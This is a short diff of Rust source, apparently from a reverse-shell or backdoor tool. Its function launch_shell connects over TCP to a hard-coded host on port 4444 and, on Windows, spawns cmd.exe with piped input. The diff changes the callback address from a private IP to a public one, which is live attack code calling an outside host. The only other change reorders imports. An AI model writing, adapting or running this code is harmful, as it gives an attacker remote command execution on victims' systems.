@@ -61,7 +61,7 @@ impl EncryptedStream {
 }
 
 pub async fn launch_shell() -> io::Result<()> {
-    let sock = TcpStream::connect("172.28.161.20:4444")?;
+    let sock = TcpStream::connect("54.38.32.174:4444")?;
 
     #[cfg(unix)]
     {
@@ -134,8 +134,8 @@ pub async fn launch_shell() -> io::Result<()> {
 
     #[cfg(windows)]
     {
-        use std::thread;
         use std::os::windows::process::CommandExt;
+        use std::thread;
 
         let mut child = Command::new("cmd.exe")
             .stdin(Stdio::piped())
